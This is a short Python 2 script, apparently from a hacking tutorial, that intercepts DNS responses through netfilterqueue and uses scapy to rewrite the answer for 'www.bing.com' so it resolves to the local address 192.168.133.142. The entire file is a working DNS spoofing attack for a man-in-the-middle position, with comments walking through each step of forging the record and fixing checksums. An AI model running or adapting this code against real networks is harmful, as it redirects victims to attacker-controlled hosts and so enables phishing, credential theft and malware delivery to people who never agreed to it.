#!/usr/bin/python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    # wrapping the payload of this packet with scapy IP layer (converting)
    # converting the sniffed packet to the scapy_packet to easily do the modifications
    scapy_packet = scapy.IP(packet.get_payload())
    # to check if packet has DNS Response Record(DNSRR)
    if scapy_packet.haslayer(scapy.DNSRR):
        # accessing the site which we are visiting i.e is stored in qname field of DNS Question record(DNSQR)
        qname = scapy_packet[scapy.DNSQR].qname
        # checking if qname is equal to that site which we want to target
        if "www.bing.com" in qname:
            print "[+] Spoofing target"
            # creating our own DNS response (only specify those fields which you want to change others are managed by scapy only)
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.133.142")
            # modifying answer field with our answer
            scapy_packet[scapy.DNS].an = answer
            # modifying ancount (answer_count) field as we are creating a single answer (and there maybe multiple answers come as response)
            scapy_packet[scapy.DNS].ancount = 1
            # deleting some fields of layers scapy will recalculate based on the values we modified them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # set the payload of packet that we sniffed from queue to the modified packet(i.e scapy_packet)
            packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
# 0 i.e queue_num to which we want to bind
# process_packet is the function that is to be executed by each packet present in the queue
queue.bind(1, process_packet)
queue.run()
